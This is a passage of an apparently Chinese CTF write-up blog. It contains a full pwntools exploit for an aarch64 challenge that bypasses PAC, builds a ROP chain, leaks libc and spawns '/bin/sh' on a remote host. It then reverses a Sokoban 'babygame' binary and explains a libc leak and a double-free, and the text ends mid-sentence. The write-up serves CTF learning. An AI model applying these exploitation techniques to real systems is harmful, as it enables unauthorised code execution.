class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&quot;./chall&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">elf = ELF(file_path)</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process([<span class="string">&quot;qemu-aarch64&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;-g&quot;</span>, <span class="string">&quot;1234&quot;</span>, file_path])</span><br><span class="line">    <span class="comment"># p = process([&quot;qemu-aarch64&quot;, &quot;-L&quot;, &quot;.&quot;, file_path])</span></span><br><span class="line">    <span class="comment"># gdb.attach(p)</span></span><br><span class="line">    libc = ELF(<span class="string">&#x27;./lib/libc.so.6&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;52.255.184.147&#x27;</span>, <span class="number">8080</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;./lib/libc.so.6&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">.text:0000000000400FD4                 MOV             X19, #0</span></span><br><span class="line"><span class="string">.text:0000000000400FD8</span></span><br><span class="line"><span class="string">.text:0000000000400FD8 loc_400FD8                              ; CODE XREF: sub_400F90+64↓j</span></span><br><span class="line"><span class="string">.text:0000000000400FD8                 LDR             X3, [X21,X19,LSL#3]</span></span><br><span class="line"><span class="string">.text:0000000000400FDC                 MOV             X2, X24</span></span><br><span class="line"><span class="string">.text:0000000000400FE0                 ADD             X19, X19, #1</span></span><br><span class="line"><span class="string">.text:0000000000400FE4                 MOV             X1, X23</span></span><br><span class="line"><span class="string">.text:0000000000400FE8                 MOV             W0, W22</span></span><br><span class="line"><span class="string">.text:0000000000400FEC                 BLR             X3</span></span><br><span class="line"><span class="string">.text:0000000000400FF0                 CMP             X20, X19</span></span><br><span class="line"><span class="string">.text:0000000000400FF4                 B.NE            loc_400FD8</span></span><br><span class="line"><span class="string">.text:0000000000400FF8</span></span><br><span class="line"><span class="string">.text:0000000000400FF8 loc_400FF8                              ; CODE XREF: sub_400F90+3C↑j</span></span><br><span class="line"><span class="string">.text:0000000000400FF8                 LDP             X19, X20, [SP,#var_s10]</span></span><br><span class="line"><span class="string">.text:0000000000400FFC                 LDP             X21, X22, [SP,#var_s20]</span></span><br><span class="line"><span class="string">.text:0000000000401000                 LDP             X23, X24, [SP,#var_s30]</span></span><br><span class="line"><span class="string">.text:0000000000401004                 LDP             X29, X30, [SP+var_s0],#0x40</span></span><br><span class="line"><span class="string">.text:0000000000401008                 RET</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">csu_start = <span class="number">0x400FF8</span></span><br><span class="line">csu_end = <span class="number">0x400FD8</span></span><br><span class="line">name_add = <span class="number">0x412030</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">call_addr, arg0, arg1, arg2, jmp_addr=csu_end</span>):</span><br><span class="line">    payload = p64(<span class="number">0</span>) + p64(jmp_addr)</span><br><span class="line">    payload += p64(<span class="number">0</span>) + p64(<span class="number">1</span>)</span><br><span class="line">    payload += p64(call_addr) + p64(arg0)</span><br><span class="line">    payload += p64(arg1) + p64(arg2)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;identity: &quot;</span>, <span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lock</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;idx: &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">auth</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;idx: &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">temp</span>(<span class="params">s, e</span>):</span><br><span class="line">    <span class="keyword">return</span> ((<span class="number">1</span> &lt;&lt; e) - <span class="number">1</span>) - ((<span class="number">1</span> &lt;&lt; s) - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">re</span>(<span class="params">n</span>):</span><br><span class="line">    i = <span class="number">64</span></span><br><span class="line">    <span class="keyword">while</span> i &gt; <span class="number">0</span>:</span><br><span class="line">        n = n ^ ((n &amp; temp(<span class="built_in">max</span>(<span class="number">0</span>, i - <span class="number">13</span>), i)) &gt;&gt; <span class="number">13</span>)</span><br><span class="line">        n = n &amp; ((<span class="number">1</span> &lt;&lt; <span class="number">64</span>) - <span class="number">1</span>)</span><br><span class="line">        i = i - <span class="number">13</span></span><br><span class="line"></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; <span class="number">64</span>:</span><br><span class="line">        n = n ^ ((n &amp; temp(i, <span class="built_in">min</span>(i + <span class="number">31</span>, <span class="number">64</span>))) &lt;&lt; <span class="number">31</span>)</span><br><span class="line">        n = n &amp; ((<span class="number">1</span> &lt;&lt; <span class="number">64</span>) - <span class="number">1</span>)</span><br><span class="line">        i = i + <span class="number">31</span></span><br><span class="line"></span><br><span class="line">    i = <span class="number">64</span></span><br><span class="line">    <span class="keyword">while</span> i &gt; <span class="number">0</span>:</span><br><span class="line">        n = n ^ ((n &amp; temp(<span class="built_in">max</span>(<span class="number">0</span>, i - <span class="number">11</span>), i)) &gt;&gt; <span class="number">11</span>)</span><br><span class="line">        n = n &amp; ((<span class="number">1</span> &lt;&lt; <span class="number">64</span>) - <span class="number">1</span>)</span><br><span class="line">        i = i - <span class="number">11</span></span><br><span class="line"></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; <span class="number">64</span>:</span><br><span class="line">        n = n ^ ((n &amp; temp(i, <span class="built_in">min</span>(i + <span class="number">7</span>, <span class="number">64</span>))) &lt;&lt; <span class="number">7</span>)</span><br><span class="line">        n = n &amp; ((<span class="number">1</span> &lt;&lt; <span class="number">64</span>) - <span class="number">1</span>)</span><br><span class="line">        i = i + <span class="number">7</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> n</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">0</span>:</span><br><span class="line">    p.recvuntil(<span class="string">&quot;xxxx+&quot;</span>)</span><br><span class="line">    key = p.recvuntil(<span class="string">&quot;)&quot;</span>, drop=<span class="literal">True</span>).decode()</span><br><span class="line">    p.recvuntil(<span class="string">&quot;== &quot;</span>)</span><br><span class="line">    <span class="built_in">hash</span> = p.recvline().strip(<span class="string">b&quot;\n&quot;</span>).decode()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;key is &quot;</span>, key, <span class="string">&quot; hash is &quot;</span>, <span class="built_in">hash</span>)</span><br><span class="line"></span><br><span class="line">    code = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    strlist = itertools.product(string.ascii_letters + string.digits, repeat=<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> strlist:</span><br><span class="line">        code = i[<span class="number">0</span>] + i[<span class="number">1</span>] + i[<span class="number">2</span>] + i[<span class="number">3</span>]</span><br><span class="line">        encinfo = hashlib.sha256((code + key).encode(<span class="string">&quot;utf-8&quot;</span>)).hexdigest()</span><br><span class="line">        <span class="keyword">if</span> encinfo == <span class="built_in">hash</span>:</span><br><span class="line">            <span class="built_in">print</span>(code)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    p.sendline(code)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">name = p64(csu_start) + p64(<span class="number">0</span>) + p64(<span class="number">0x10A9FC70042</span>) + p64(<span class="number">0</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;input your name: &quot;</span>, name)</span><br><span class="line"></span><br><span class="line">lock(-<span class="number">2</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&quot;name: &quot;</span>)</span><br><span class="line">pac = u64(p.recvline().strip(<span class="string">b&quot;\n&quot;</span>)[:-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">new_csu_start = re(pac)</span><br><span class="line">log.success(<span class="string">&quot;pac csu start address is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(new_csu_start)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">lock(-<span class="number">1</span>)</span><br><span class="line">auth(-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(new_csu_start)</span><br><span class="line">payload += csu(puts_got, read_got, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">payload += csu(read_got, <span class="number">0</span>, name_add, <span class="number">0x20</span>)</span><br><span class="line">payload += csu(name_add, name_add+<span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">libc.address = u64(p.recvline().strip(<span class="string">b&quot;\n&quot;</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) + <span class="number">0x4000000000</span> - libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc address is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc.address)))</span><br><span class="line"></span><br><span class="line">p.sendline(p64(libc.sym[<span class="string">&#x27;system&#x27;</span>]) + <span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="babygame"><a href="#babygame" class="headerlink" title="babygame"></a>babygame</h2><p>程序实现了一个类似于迷宫的操作，提供了如下的几种功能</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">h</span><br><span class="line">     Sokoban</span><br><span class="line">How to Play:</span><br><span class="line">    Push all boxs into target place</span><br><span class="line">Map:</span><br><span class="line">    <span class="number">1</span>)█:wall</span><br><span class="line">    <span class="number">2</span>)○:Target</span><br><span class="line">    <span class="number">3</span>)□:Box</span><br><span class="line">    <span class="number">4</span>)♀:Player</span><br><span class="line">    <span class="number">5</span>)●:Box on target</span><br><span class="line">Command:</span><br><span class="line">    <span class="number">1</span>)h: show this message</span><br><span class="line">    <span class="number">2</span>)q: quit the game</span><br><span class="line">    <span class="number">3</span>)w: move up</span><br><span class="line">    <span class="number">4</span>)s: move down</span><br><span class="line">    <span class="number">5</span>)a: move left</span><br><span class="line">    <span class="number">6</span>)d: move right</span><br><span class="line">    <span class="number">7</span>)b: move back</span><br><span class="line">    <span class="number">8</span>)m: leave message</span><br><span class="line">    k)n: show name</span><br><span class="line">    <span class="number">10</span>)l: show message</span><br></pre></td></tr></table></figure><p>目前逆向出的<code>game</code>结构体如下，其中<code>map</code>另有结构体存储。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> game            struc ; (<span class="keyword">sizeof</span>=<span class="number">0x50</span>, mappedto_7)</span><br><span class="line"><span class="number">00000000</span> map_vector_start dq ?</span><br><span class="line"><span class="number">00000008</span> current_vector  dq ?</span><br><span class="line"><span class="number">00000010</span> vector_end      dq ?</span><br><span class="line"><span class="number">00000018</span> start_time      dq ?</span><br><span class="line"><span class="number">00000020</span> end_time        dq ?</span><br><span class="line"><span class="number">00000028</span> cost_time       dq ?</span><br><span class="line"><span class="number">00000030</span> level           dd ?</span><br><span class="line"><span class="number">00000034</span> unknown         dd ?</span><br><span class="line"><span class="number">00000038</span> step_forward    db ?</span><br><span class="line"><span class="number">00000039</span> is_quit         db ?</span><br><span class="line"><span class="number">0000003</span>A                 db ? ; undefined</span><br><span class="line"><span class="number">0000003B</span>                 db ? ; undefined</span><br><span class="line"><span class="number">0000003</span>C                 db ? ; undefined</span><br><span class="line"><span class="number">0000003</span>D                 db ? ; undefined</span><br><span class="line"><span class="number">0000003</span>E                 db ? ; undefined</span><br><span class="line"><span class="number">0000003F</span>                 db ? ; undefined</span><br><span class="line"><span class="number">00000040</span> <span class="built_in">map</span>             dq ?</span><br><span class="line"><span class="number">00000048</span> message         dq ?</span><br><span class="line"><span class="number">00000050</span> game            ends</span><br></pre></td></tr></table></figure><p>程序的主要逻辑如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">__int64 __usercall main@&lt;rax&gt;(__int64 a1@&lt;rdi&gt;, <span class="type">char</span> **a2@&lt;rsi&gt;, <span class="type">char</span> **a3@&lt;rdx&gt;, <span class="type">unsigned</span> <span class="type">int</span> a4@&lt;r12d&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v4; <span class="comment">// rdi</span></span><br><span class="line">  <span class="type">char</span> v6; <span class="comment">// [rsp+Eh] [rbp-2h]</span></span><br><span class="line"></span><br><span class="line">  v6 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v6 )</span><br><span class="line">  &#123;</span><br><span class="line">    game_func(a4);</span><br><span class="line">    v4 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;restart?&quot;</span>);</span><br><span class="line">    <span class="built_in">std</span>::ostream::operator&lt;&lt;(v4, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)get_input_filter(v4, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;) != <span class="number">121</span> )</span><br><span class="line">      v6 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> __int64 __usercall game_func@&lt;rax&gt;(<span class="type">unsigned</span> <span class="type">int</span> a1@&lt;r12d&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v2; <span class="comment">// [rsp+0h] [rbp-90h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+78h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init_game((game *)&amp;v2, <span class="number">0</span>);</span><br><span class="line">  game_start((game *)&amp;v2, <span class="number">0LL</span>, a1);</span><br><span class="line">  result = leave_name((__int64)&amp;v2);</span><br><span class="line">  __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __usercall <span class="title function_">game_start</span><span class="params">(game *a1@&lt;rdi&gt;, <span class="type">unsigned</span> __int64 a2@&lt;rsi&gt;, <span class="type">unsigned</span> <span class="type">int</span> a3@&lt;r12d&gt;)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> num; <span class="comment">// ST1F_1</span></span><br><span class="line">  game *a1a; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  a1a = a1;</span><br><span class="line">  sub_FE91();</span><br><span class="line">  a1-&gt;step_forward = <span class="number">1</span>;</span><br><span class="line">  a1-&gt;level = <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">while</span> ( !a1a-&gt;is_quit )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( a1a-&gt;level == <span class="number">-1</span> &amp;&amp; !a1a-&gt;is_quit )</span><br><span class="line">    &#123;</span><br><span class="line">      num = get_input((__int64)a1, (<span class="type">void</span> *)a2);</span><br><span class="line">      a2 = (<span class="type">unsigned</span> <span class="type">int</span>)num;</span><br><span class="line">      a1 = a1a;</span><br><span class="line">      detec_error_quit(a1a, num);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( a1a-&gt;is_quit )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    get_map(a1a);</span><br><span class="line">    handle_step(a1a, a3);</span><br><span class="line">    a1 = a1a;</span><br><span class="line">    put_map_vector(a1a);</span><br><span class="line">  &#125;</span><br><span class="line">  sub_FE98();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">leave_name</span><span class="params">(game *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rdi</span></span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  game *v4; <span class="comment">// [rsp+8h] [rbp-48h]</span></span><br><span class="line">  __int64 name; <span class="comment">// [rsp+20h] [rbp-30h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = a1;</span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v1 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;leave your name?&quot;</span>);</span><br><span class="line">  <span class="built_in">std</span>::ostream::operator&lt;&lt;(v1, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)get_input_filter(v1, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;) == <span class="string">&#x27;y&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;your name:&quot;</span>);</span><br><span class="line">    <span class="built_in">std</span>::ostream::operator&lt;&lt;(v2, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">    <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="type">char</span>&gt;&gt;::basic_string(&amp;name);</span><br><span class="line">    <span class="built_in">std</span>::getline&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="type">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cin</span>, &amp;name);</span><br><span class="line">    put_name_to_vector((game *)&amp;::a1, (__int64)&amp;name);</span><br><span class="line">    <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="type">char</span>&gt;&gt;::~basic_string(&amp;name, &amp;name);</span><br><span class="line">  &#125;</span><br><span class="line">  clear_map_vector(v4);</span><br><span class="line">  operator <span class="title function_">delete</span><span class="params">((<span class="type">void</span> *)v4-&gt;message)</span>;</span><br><span class="line">  sub_C026(v4);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序存在两个漏洞，一个是算是<code>message</code>脏数据。首先在<code>init_game</code>函数中为<code>game-&gt;message</code>分配空间的时候并没有清空内存中的数据，而<code>message</code>的堆块大小为<code>0x510</code>，也就是说释放之后重新申请即可以泄漏得到<code>libc</code>基址。程序恰好存在<code>restart</code>的情况，因此我们可以据此泄漏得到<code>libc</code>基址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">send_level(<span class="string">&quot;q&quot;</span>)</span><br><span class="line">send_order(<span class="string">&quot;n&quot;</span>)</span><br><span class="line">send_order(<span class="string">&quot;y&quot;</span>)</span><br><span class="line">send_level(<span class="string">&quot;l&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;message:&quot;</span>)</span><br><span class="line">libc.address = u64(p.recvline().strip(<span class="string">b&quot;\n&quot;</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) - <span class="number">96</span> - <span class="number">0x10</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc address is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc.address)))</span><br></pre></td></tr></table></figure><p>另一个就是<code>map+0xe0</code>处保存指针的<code>double free</code>漏洞。该处的漏洞是在调试中发现的，在<code>update level</code>之后退出会出现一个<code>double free</code>的漏洞，堆块的大小是<code>0x60</code>。那么接下来就是<code>double free</code>如何利用的问题了。我们能够进行任意堆块分配的就是<code>message</code>了。但是程序中采用的是<code>cin</code>进行读取的，不能覆盖到<code>0x60</code>的堆块。但是我们看到在读取得到<code>message</code>之后会将其<code>put vector</code>。在该函数中会将按照我们输入的<code>message</code>的长度进行堆块申请</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( current_vector_c )</span><br><span class="line">  current_vector_c = <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="type">char</span>&gt;&gt;::basic_string(</span><br><span class="line">    current_vector_c,</span><br><span class="line">    name_c);</span><br></pre></td></tr></table></figure><p>这里就达到了我们任意申请堆块的目的。下面就是正常的<code>double 